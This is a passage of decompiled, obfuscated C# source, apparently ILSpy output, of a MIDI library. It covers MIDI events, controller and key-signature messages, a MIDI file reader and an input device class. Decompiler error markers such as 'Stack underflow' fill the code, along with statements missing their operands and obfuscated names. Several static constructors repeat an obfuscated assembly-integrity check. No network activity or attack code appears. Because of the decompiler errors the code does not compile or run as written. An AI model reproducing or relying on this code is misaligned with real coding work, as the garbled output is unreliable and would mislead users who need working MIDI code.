			_ = (object)((global::_0013._0010)/*Error near IL_0013: Stack underflow*/)._0001;
			object obj = ((_0011)/*Error near IL_001f: Stack underflow*/)._0001;
			return /*Error near IL_0029: Stack underflow*/((string)/*Error near IL_0029: Stack underflow*/, (object)/*Error near IL_0029: Stack underflow*/, obj);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)this._0001);
			global::_0011._0018._0001(_0003, this._0001);
		}
	}
}
namespace _0013
{
	internal class _0010 : ICloneable
	{
		internal MidiCommandCode _0001;

		internal int _0001;

		internal int _0002;

		internal long _0001;

		public virtual int Channel
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_0044: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 1 || (int)/*Error near IL_000b: Stack underflow*/ > 16)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(actualValue: value, message: _0008_0002._0007_0005(_0080._0014._0001(107383405), value), paramName: (string?)/*Error near IL_0037: Stack underflow*/);
				}
				this._0001 = value;
			}
		}

		public int DeltaTime => ((_0010)/*Error near IL_0007: Stack underflow*/)._0002;

		public long AbsoluteTime
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public MidiCommandCode CommandCode => ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;

		public virtual int _0001()
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected I4, but got Unknown
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 2
			_ = ((_0010)/*Error near IL_0007: Stack underflow*/)._0001 - 1;
			MidiCommandCode num = ((_0010)/*Error near IL_0010: Stack underflow*/)._0001;
			return /*Error near IL_0011: Stack underflow*/+ num;
		}

		protected internal _0010()
		{
		}

		public _0010(long _0004_0091_0006, int _008D_0090_0006, MidiCommandCode _0010_0091_0006)
		{
			this._0001 = _0004_0091_0006;
			Channel = _008D_0090_0006;
			this._0001 = _0010_0091_0006;
		}

		public virtual _0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0010)/*Error near IL_000a: Stack underflow*/;
		}

		private object _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			((_0010)/*Error near IL_000d: Stack underflow*/)._0001();
			return (object)/*Error near IL_0005: Stack underflow*/;
		}

		object ICloneable.Clone()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}

		public override string ToString()
		{
			//IL_006e: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 2
			//IL_0078: Incompatible stack heights: 0 vs 1
			if ((int)((_0010)/*Error near IL_0007: Stack underflow*/)._0001 >= 240)
			{
				_ = _009D._0093_0004;
				_0080._0014._0001(107395853);
				object obj = ((_0010)/*Error near IL_0021: Stack underflow*/)._0001;
				object obj2 = this._0001;
				return /*Error near IL_0036: Stack underflow*/((string)/*Error near IL_0036: Stack underflow*/, obj, obj2);
			}
			return _0089_0002._0092_0005(_0080._0014._0001(107383364), this._0001, this._0001, this._0001);
		}

		public unsafe virtual void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_000a: Invalid comparison between Unknown and I8
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 2
			//IL_0069: Incompatible stack heights: 0 vs 1
			_ = ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			long num = *(long*)(nint)/*Error near IL_000a: Stack underflow*/;
			if ((long)/*Error near IL_000c: Stack underflow*/ < num)
			{
				_0080._0014._0001(107383343);
				throw new FormatException((string?)/*Error near IL_0018: Stack underflow*/);
			}
			global::_0011._0018._0001(_0003, (int)(this._0001 - _0002));
			_0002 = this._0001;
			int num2 = (int)this._0001;
			if (this._0001 != MidiCommandCode.MetaEvent)
			{
				num2 += this._0001 - 1;
			}
			_0084_0003._007E_007F_0007(_0003, (byte)num2);
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	internal sealed class _0010 : EventArgs
	{
		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private global::_0013._0010 _0001;

		[CompilerGenerated]
		private int _0002;

		public int RawMessage
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0013._0010 MidiEvent
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0013._0010)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Timestamp
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0010(int _001F_001E_0006, int _0012_0019)
		{
			RawMessage = _001F_001E_0006;
			Timestamp = _0012_0019;
			try
			{
				MidiEvent = global::_0011._0018._0001(_001F_001E_0006);
			}
			catch (Exception)
			{
			}
		}
	}
}
namespace _001C
{
	internal sealed class _0008 : global::_0013._0010
	{
		private new byte m__0001;

		public int AfterTouchPressure
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0036: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107383829), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				this.m__0001 = (byte)value;
			}
		}

		public _0008(BinaryReader _0086_0088_0003)
		{
			this.m__0001 = _0086_0088_0003.ReadByte();
			if ((this.m__0001 & 0x80u) != 0)
			{
				throw new FormatException(_0080._0014._0001(107383866));
			}
		}

		public _0008(long _0004_0091_0006, int _008D_0090_0006, int _0005_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.ChannelAfterTouch)
		{
			AfterTouchPressure = _0005_0091_0006;
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	internal sealed class _0010 : global::_0013._0010
	{
		private new MidiController m__0001;

		private new byte m__0001;

		public MidiController Controller
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107384097), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				this.m__0001 = value;
			}
		}

		public int ControllerValue
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0036: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107383524), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				this.m__0001 = (byte)value;
			}
		}

		public _0010(BinaryReader _0086_0088_0003)
		{
			byte b = _0086_0088_0003.ReadByte();
			this.m__0001 = _0086_0088_0003.ReadByte();
			if ((b & 0x80u) != 0)
			{
				throw new InvalidDataException(_0080._0014._0001(107384276));
			}
			this.m__0001 = (MidiController)b;
			if ((this.m__0001 & 0x80u) != 0)
			{
				throw new InvalidDataException(string.Format(_0080._0014._0001(107384251), this.m__0001, this.m__0001, _0086_0088_0003.BaseStream.Position));
			}
		}

		public _0010(long _0004_0091_0006, int _008D_0090_0006, MidiController _0006_0091_0006, int _0007_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.ControlChange)
		{
			Controller = _0006_0091_0006;
			ControllerValue = _0007_0091_0006;
		}

		public override string ToString()
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107384138);
			((global::_0013._0010)/*Error near IL_003b: Stack underflow*/).ToString();
			object obj = this.m__0001;
			object obj2 = this.m__0001;
			return /*Error near IL_002b: Stack underflow*/((string)/*Error near IL_002b: Stack underflow*/, (object)/*Error near IL_002b: Stack underflow*/, obj, obj2);
		}

		public override int _0001()
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			byte b = (byte)((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			return ((global::_0013._0010)/*Error near IL_0010: Stack underflow*/)._0001() + (b << 8) + (this.m__0001 << 16);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)this.m__0001);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
		}
	}
}
namespace _001B
{
	internal sealed class _0011 : global::_0014._0011
	{
		private new byte m__0001;

		private new byte _0002;

		public int SharpsFlats => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int MajorMinor => ((_0011)/*Error near IL_0007: Stack underflow*/)._0002;

		public _0011(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			if (_0089_0010 != 2)
			{
				throw new FormatException(_0080._0014._0001(107383463));
			}
			this.m__0001 = _0086_0088_0003.ReadByte();
			_0002 = _0086_0088_0003.ReadByte();
		}

		public _0011(int _0008_0091_0006, int _000E_0091_0006, long _0004_0091_0006)
			: base(MetaEventType.KeySignature, 2, _0004_0091_0006)
		{
			this.m__0001 = (byte)_0008_0091_0006;
			_0002 = (byte)_000E_0091_0006;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0011)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107383454);
			((global::_0014._0011)/*Error near IL_003b: Stack underflow*/).ToString();
			object obj = this.m__0001;
			object obj2 = _0002;
			return /*Error near IL_002b: Stack underflow*/((string)/*Error near IL_002b: Stack underflow*/, (object)/*Error near IL_002b: Stack underflow*/, obj, obj2);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
			_0084_0003._007E_007F_0007(_0003, this._0002);
		}

		static _0011()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	internal sealed class _0014 : IEnumerable, IEnumerable<IList<global::_0013._0010>>
	{
		internal int _0001;

		internal List<IList<global::_0013._0010>> _0001;

		internal int _0002;

		internal long _0001;

		public int Tracks
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public long StartAbsoluteTime
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int DeltaTicksPerQuarterNote => ((_0014)/*Error near IL_0007: Stack underflow*/)._0002;

		public IList<global::_0013._0010> this[int _0002]
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((List<IList<global::_0013._0010>>)/*Error near IL_0017: Stack underflow*/)[(int)/*Error near IL_0017: Stack underflow*/];
				return (IList<global::_0013._0010>)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public int MidiFileType
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 2
				//IL_002b: Incompatible stack heights: 0 vs 1
				_ = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				if (/*Error near IL_000b: Stack underflow*/ != /*Error near IL_000b: Stack underflow*/)
				{
					((_0014)/*Error near IL_0013: Stack underflow*/)._0001 = value;
					if (value == 0)
					{
						global::_0011._0018._0001(this);
					}
					else
					{
						global::_0011._0018._0001(this);
					}
				}
			}
		}

		public _0014(int _0011_0091_0006, int _0012_0091_0006)
		{
			this._0001 = _0011_0091_0006;
			_0002 = _0012_0091_0006;
			this._0001 = 0L;
			this._0001 = new List<IList<global::_0013._0010>>();
		}

		public void _0001()
		{
			//IL_011a: Incompatible stack heights: 0 vs 1
			//IL_0126: Incompatible stack heights: 0 vs 1
			new global::_0012._000E();
			global::_0012._000E obj = default(global::_0012._000E);
			if (0 == 0)
			{
				obj = (global::_0012._000E)/*Error near IL_0120: Stack underflow*/;
			}
			foreach (List<global::_0013._0010> item in ((_0014)/*Error near IL_0016: Stack underflow*/)._0001)
			{
				global::_0017._0016._0001(item, obj);
				int num = 0;
				while (num < item.Count - 1)
				{
					if (global::_0011._0018._0001(item[num]))
					{
						item.RemoveAt(num);
					}
					else
					{
						num++;
					}
				}
			}
			int num2 = 0;
			while (num2 < this._0001.Count)
			{
				IList<global::_0013._0010> list2 = this._0001[num2];
				if (list2.Count == 0)
				{
					global::_0011._0018._0001(this, num2);
					continue;
				}
				if (list2.Count == 1 && global::_0011._0018._0001(list2[0]))
				{
					global::_0011._0018._0001(this, num2);
					continue;
				}
				if (!global::_0011._0018._0001(list2[list2.Count - 1]))
				{
					list2.Add(new global::_0014._0011(MetaEventType.EndTrack, 0, list2[list2.Count - 1]._0001));
				}
				num2++;
			}
		}

		public IEnumerator<IList<global::_0013._0010>> _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			((_0014)/*Error near IL_0007: Stack underflow*/)._0001.GetEnumerator();
			return (List<IList<global::_0013._0010>>.Enumerator)/*Error near IL_000e: Stack underflow*/;
		}

		IEnumerator<IList<global::_0013._0010>> IEnumerable<IList<global::_0013._0010>>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}

		private IEnumerator _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			((_0014)/*Error near IL_0007: Stack underflow*/)._0001.GetEnumerator();
			return (List<IList<global::_0013._0010>>.Enumerator)/*Error near IL_000e: Stack underflow*/;
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}
	}
}
namespace _0012
{
	internal sealed class _000E : IComparer<global::_0013._0010>
	{
		public int _0001(global::_0013._0010 _0002, global::_0013._0010 _0003)
		{
			//IL_0079: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 1
			long num = ((global::_0013._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			long num2 = ((global::_0013._0010)/*Error near IL_0016: Stack underflow*/)._0001;
			if (num == num2)
			{
				global::_0014._0011 obj = _0002 as global::_0014._0011;
				global::_0014._0011 obj2 = _0003 as global::_0014._0011;
				if (obj != null)
				{
					num = ((obj._0001 != MetaEventType.EndTrack) ? long.MinValue : long.MaxValue);
				}
				if (obj2 != null)
				{
					num2 = ((obj2._0001 != MetaEventType.EndTrack) ? long.MinValue : long.MaxValue);
				}
			}
			return num.CompareTo(num2);
		}

		int IComparer<global::_0013._0010>.Compare(global::_0013._0010 _0002, global::_0013._0010 _0003)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002, _0003);
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001A
{
	internal sealed class _0008
	{
		private global::_0016._0014 m__0001;

		private ushort m__0001;

		private ushort _0002;

		private bool m__0001;

		public int FileFormat => ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;

		public global::_0016._0014 Events => ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int Tracks
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001.Tracks;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public int DeltaTicksPerQuarterNote => ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;

		public _0008(string _0096_0093)
			: this(_0096_0093, _0013_0091_0006: true)
		{
		}

		public _0008(string _0096_0093, bool _0013_0091_0006)
		{
			this.m__0001 = _0013_0091_0006;
			BinaryReader binaryReader = new BinaryReader(File.OpenRead(_0096_0093));
			using (binaryReader)
			{
				if (Encoding.UTF8.GetString(binaryReader.ReadBytes(4)) != _0080._0014._0001(107383298))
				{
					throw new FormatException(_0080._0014._0001(107383321));
				}
				uint num = global::_0011._0018._0001(binaryReader.ReadUInt32());
				if (num != 6)
				{
					throw new FormatException(_0080._0014._0001(107383748));
				}
				this.m__0001 = global::_0011._0018._0001(binaryReader.ReadUInt16());
				int num2 = global::_0011._0018._0001(binaryReader.ReadUInt16());
				_0002 = global::_0011._0018._0001(binaryReader.ReadUInt16());
				this.m__0001 = new global::_0016._0014((this.m__0001 != 0) ? 1 : 0, _0002);
				for (int i = 0; i < num2; i++)
				{
					global::_0011._0018._0001(this.m__0001);
				}
				long num3 = 0L;
				for (int j = 0; j < num2; j++)
				{
					if (this.m__0001 == 1)
					{
						num3 = 0L;
					}
					if (Encoding.UTF8.GetString(binaryReader.ReadBytes(4)) != _0080._0014._0001(107383739))
					{
						throw new FormatException(_0080._0014._0001(107383730));
					}
					num = global::_0011._0018._0001(binaryReader.ReadUInt32());
					long position = binaryReader.BaseStream.Position;
					global::_0013._0010 obj = null;
					List<_007F._0010> list = new List<_007F._0010>();
					while (binaryReader.BaseStream.Position < position + num)
					{
						obj = global::_0011._0018._0001(binaryReader, obj);
						num3 = (obj._0001 = num3 + obj._0002);
						this.m__0001[j].Add(obj);
						if (obj._0001 == MidiCommandCode.NoteOn)
						{
							global::_0013._0011 obj2 = (global::_0013._0011)obj;
							if (obj2._0002 > 0)
							{
								list.Add((_007F._0010)obj2);
							}
							else
							{
								_0001(obj2, list);
							}
						}
						else if (obj._0001 == MidiCommandCode.NoteOff)
						{
							_0001((global::_0013._0011)obj, list);
						}
						else if (obj._0001 == MidiCommandCode.MetaEvent && ((global::_0014._0011)obj)._0001 == MetaEventType.EndTrack && _0013_0091_0006 && binaryReader.BaseStream.Position < position + num)
						{
							throw new FormatException(string.Format(_0080._0014._0001(107383701), j));
						}
					}
					if (list.Count > 0 && _0013_0091_0006)
					{
						throw new FormatException(string.Format(_0080._0014._0001(107383592), list.Count, this.m__0001));
					}
					if (binaryReader.BaseStream.Position != position + num)
					{
						throw new FormatException(string.Format(_0080._0014._0001(107383015), num, position, binaryReader.BaseStream.Position));
					}
				}
			}
		}

		private void _0001(global::_0013._0011 _0002, List<_007F._0010> _0003)
		{
			//IL_0089: Incompatible stack heights: 0 vs 1
			//IL_0093: Incompatible stack heights: 0 vs 1
			bool flag = false;
			((List<_007F._0010>)/*Error near IL_0093: Stack underflow*/).GetEnumerator();
			using (List<_007F._0010>.Enumerator enumerator = /*Error near IL_000e: Stack underflow*/)
			{
				while (enumerator.MoveNext())
				{
					_007F._0010 current = enumerator.Current;
					if (current.Channel == _0002.Channel && current.NoteNumber == _0002.NoteNumber)
					{
						current.OffEvent = _0002;
						_0003.Remove(current);
						flag = true;
						break;
					}
				}
			}
			if (!flag && this.m__0001)
			{
				throw new FormatException(string.Format(_0080._0014._0001(107382978), _0002));
			}
		}

		public override string _0001()
		{
			//IL_00b9: Incompatible stack heights: 0 vs 1
			//IL_00c5: Incompatible stack heights: 0 vs 2
			new StringBuilder();
			StringBuilder stringBuilder;
			if (6u != 0)
			{
				stringBuilder = (StringBuilder)/*Error near IL_00bf: Stack underflow*/;
			}
			_ = _0086_0003._007E_0080_0007;
			string text = _0080._0014._0001(107382969);
			object obj = this.m__0001;
			object obj2 = Tracks;
			object obj3 = _0002;
			/*Error near IL_0046: Stack underflow*/((object)/*Error near IL_0046: Stack underflow*/, text, obj, obj2, obj3);
			for (int i = 0; i < Tracks; i++)
			{
				IEnumerator<global::_0013._0010> enumerator = this.m__0001[i].GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						global::_0013._0010 current = enumerator.Current;
						_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107393555), current);
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			return global::_0002._007E_0006(stringBuilder);
		}
	}
}
namespace _0010
{
	internal sealed class _0010 : IDisposable
	{
		internal IntPtr _0001 = IntPtr.Zero;

		private bool m__0001;

		private global::_0018._0012._0003 m__0001;

		[CompilerGenerated]
		private EventHandler<global::_001F._0010> m__0001;

		[CompilerGenerated]
		private EventHandler<global::_001F._0010> m__0002;

		public static int NumberOfDevices
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public event EventHandler<global::_001F._0010> MessageReceived
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_001F._0010> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_001F._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_001F._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_001F._0010> value2 = (EventHandler<global::_001F._0010>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_001F._0010> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_001F._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_001F._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_001F._0010> value2 = (EventHandler<global::_001F._0010>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

